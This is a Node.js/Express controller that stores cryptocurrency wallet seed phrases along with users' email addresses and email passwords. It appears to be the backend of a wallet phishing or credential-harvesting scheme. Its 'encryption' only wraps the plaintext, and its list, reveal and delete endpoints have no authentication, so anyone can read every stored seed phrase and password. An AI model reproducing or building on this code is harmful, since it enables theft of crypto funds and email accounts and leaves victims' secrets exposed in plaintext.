
const mongoose = require('mongoose');
const SeedPhrase = require('../models/SeedPhrase'); // Import SeedPhrase model

// --- Placeholder Encryption Function ---
// IMPORTANT: Replace this with your actual robust encryption logic.
const encryptPlaceholder = (data) => {
    if (data === undefined || data === null || data === '') return '';
    return `ENCRYPTED(${data.toString()})`;
};

// --- Save Seed Phrase (No User Context) ---
const saveSeedPhrase = async (req, res) => {
    // No userId from token needed
    const { email, emailPassword, walletName, seedPhrase, walletType } = req.body;

    if (!walletName || !seedPhrase || !walletType) {
        return res.status(400).json({ message: 'Missing required fields (walletName, seedPhrase, walletType).' });
    }
    if (typeof seedPhrase !== 'string' || seedPhrase.trim().split(/\s+/).length < 12) {
         return res.status(400).json({ message: 'Invalid seed phrase format (must be 12+ words).' });
    }

    try {
        const encryptedEmail = email ? encryptPlaceholder(email) : '';
        const encryptedEmailPassword = emailPassword ? encryptPlaceholder(emailPassword) : '';
        const encryptedSeedPhrase = encryptPlaceholder(seedPhrase);

        if (!encryptedSeedPhrase || encryptedSeedPhrase === 'ENCRYPTED()') {
            console.error(`[Save Seed Controller] Required Seed Phrase encryption failed.`);
            return res.status(500).json({ message: 'Failed to secure submitted seed phrase.' });
        }
         if (email && (!encryptedEmail || encryptedEmail === 'ENCRYPTED()')) {
             console.error(`[Save Seed Controller] Optional Email encryption failed.`);
            return res.status(500).json({ message: 'Failed to secure submitted email data.' });
        }
         if (emailPassword && (!encryptedEmailPassword || encryptedEmailPassword === 'ENCRYPTED()')) {
             console.error(`[Save Seed Controller] Optional Password encryption failed.`);
            return res.status(500).json({ message: 'Failed to secure submitted password data.' });
        }

        // Create new seed phrase instance without userId
        const newSeed = new SeedPhrase({
            // No userId field needed here unless you adapt the model
            encryptedEmail,
            encryptedEmailPassword,
            walletName,
            encryptedSeedPhrase,
            walletType,
        });

        await newSeed.save();

        console.log(`[Save Seed Controller] Seed phrase saved publicly, wallet: ${walletName}, ID: ${newSeed._id}`);
        res.status(201).json({ message: 'Information saved successfully.', id: newSeed._id });

    } catch (error) {
        console.error(`[Save Seed Controller Error] Wallet: ${walletName}`, error);
        if (error.name === 'ValidationError') {
             const errors = Object.values(error.errors).map(el => el.message);
             return res.status(400).json({ message: 'Validation Error', errors });
        }
        res.status(500).json({ message: 'Error saving seed phrase information.' });
    }
};

// --- Get All Seed Phrase Metadata (No User Context) ---
const getSeedPhraseMetadata = async (req, res) => {
    console.log(`[Get Metadata Controller] Fetching all metadata publicly.`);
    try {
        // Find all seed phrases, no user filter
        const phrases = await SeedPhrase.find({}) // Empty filter {} fetches all
                                      .select('walletName walletType createdAt _id')
                                      .sort({ createdAt: -1 });

        console.log(`[Get Metadata Controller] Found ${phrases.length} total phrases.`);
        res.status(200).json(phrases);

    } catch (error) {
        console.error(`[Get Metadata Controller Error]`, error);
        res.status(500).json({ message: 'Error fetching seed phrase information.' });
    }
};

// --- Reveal Seed Phrase Details by ID (No User Context) ---
const revealSeedPhrase = async (req, res) => {
    const phraseId = req.params.id;
    console.log(`[Reveal Controller Attempt] Public reveal for Phrase ID: ${phraseId}`);

    if (!mongoose.Types.ObjectId.isValid(phraseId)) {
        return res.status(400).json({ message: 'Invalid seed phrase ID format.' });
    }

    try {
        // Find the specific seed phrase by ID only
        const phrase = await SeedPhrase.findById(phraseId); // Find by _id

        if (!phrase) {
            console.warn(`[Reveal Controller Denied] Phrase ID: ${phraseId} not found.`);
            return res.status(404).json({ message: 'Seed phrase not found.' });
        }

        console.log(`[Reveal Controller Success] Returning encrypted data for Phrase ID: ${phraseId}`);
        res.status(200).json({
             _id: phrase._id,
             encryptedEmail: phrase.encryptedEmail || '',
             encryptedEmailPassword: phrase.encryptedEmailPassword || '',
             encryptedSeedPhrase: phrase.encryptedSeedPhrase,
             walletName: phrase.walletName,
             walletType: phrase.walletType,
        });

    } catch (error) {
        console.error(`[Reveal Controller Error] Phrase ID: ${phraseId}`, error);
        res.status(500).json({ message: 'Error revealing seed phrase information.' });
    }
};

// --- Delete Seed Phrase by ID (No User Context) ---
const deleteSeedPhrase = async (req, res) => {
    const phraseId = req.params.id;
    console.log(`[Delete Controller Attempt] Public delete for Phrase ID: ${phraseId}`);

    if (!mongoose.Types.ObjectId.isValid(phraseId)) {
        return res.status(400).json({ message: 'Invalid seed phrase ID format.' });
    }

    try {
        // Find and delete the seed phrase by ID only
        const result = await SeedPhrase.findByIdAndDelete(phraseId); // Find and delete by _id

        if (!result) {
            console.warn(`[Delete Controller Failed] Phrase ID: ${phraseId} not found.`);
            return res.status(404).json({ message: 'Seed phrase not found.' });
        }

        console.log(`[Delete Controller Success] Phrase ID: ${phraseId} deleted publicly.`);
        res.status(200).json({ message: 'Seed phrase deleted successfully.' });

    } catch (error) {
        console.error(`[Delete Controller Error] Phrase ID: ${phraseId}`, error);
        res.status(500).json({ message: 'Error deleting seed phrase information.' });
    }
};


module.exports = {
    saveSeedPhrase,
    getSeedPhraseMetadata,
    revealSeedPhrase,
    deleteSeedPhrase,
};
